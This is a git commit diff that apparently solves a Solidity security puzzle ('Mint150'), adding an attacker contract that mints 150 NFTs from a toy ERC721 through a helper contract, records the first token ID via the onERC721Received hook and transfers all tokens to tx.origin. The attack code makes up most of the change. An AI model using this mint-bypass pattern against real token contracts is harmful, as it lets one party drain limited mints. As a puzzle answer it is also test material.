5bd5d673a24c30dd630562bd024dd9755c57ec6a
Hammad Ghazi <hamamdghazi007@gmail.com>
2023-05-24 14:36:54 +0500

    Mint150 puzzle solved

--- contracts/contracts_optimized/Mint150.sol
+++ contracts/contracts_optimized/Mint150.sol
@@ -2,7 +2,6 @@
 pragma solidity 0.8.15;
 
 import '@openzeppelin/contracts/token/ERC721/ERC721.sol';
-import 'hardhat/console.sol';
 
 // You may not modify this contract or the openzeppelin contracts
 contract NotRareToken is ERC721 {
@@ -14,40 +13,45 @@ contract NotRareToken is ERC721 {
 
     function mint() external {
         totalSupply++;
-        console.log('Minter ', msg.sender);
-        console.log('Token id ', totalSupply);
         _safeMint(msg.sender, totalSupply);
         alreadyMinted[msg.sender] = true;
     }
 }
 
+// 1. Deployed another contract to mint NFTs because we need to obtain the tokenId of the minted NFTs in order to transfer them to the initiator of the transaction.
+// 2. Invoked the mint function of the NotRareToken contract, triggering the execution of the onERC721Received hook.
+// 3. Utilized the aforementioned hook to store the tokenId of the first minted NFT, enabling us to initiate the transfer of NFTs starting from that particular tokenId.
+// 4. Transferred the NFTs back to the initiator of the transaction.
+
 contract OptimizedAttacker {
-    address public immutable deployer;
-    NotRareToken public immutable victim;
-
-    constructor(NotRareToken _victim) {
-        console.log('deployer ', msg.sender);
-        console.log('Attacker contract ', address(this));
-        deployer = msg.sender;
-        victim = _victim;
-        // for (uint256 i = 0; i < 10; i++) {
-        this.tryMint();
-        // victim.mint();
-        // }
+    constructor(address victim) {
+        new RealAttacker().hack(NotRareToken(victim));
     }
+}
 
-    function tryMint() public {
-        victim.mint();
+contract RealAttacker {
+    uint256 tokenId;
+
+    function hack(NotRareToken _nftContract) external {
+        for (uint256 i; i < 150; i++) {
+            _nftContract.mint();
+        }
+
+        uint256 _tokenId = tokenId;
+        for (uint256 i; i < 150; i++) {
+            _nftContract.safeTransferFrom(address(this), tx.origin, _tokenId++);
+        }
     }
 
     function onERC721Received(
         address operator,
         address from,
-        uint256 tokenId,
+        uint256 _tokenId,
         bytes calldata data
     ) external returns (bytes4) {
-        console.log('Mic testing');
-        victim.safeTransferFrom(address(this), deployer, 1);
+        if (tokenId == 0) {
+            tokenId = _tokenId;
+        }
         return IERC721Receiver.onERC721Received.selector;
     }
 }
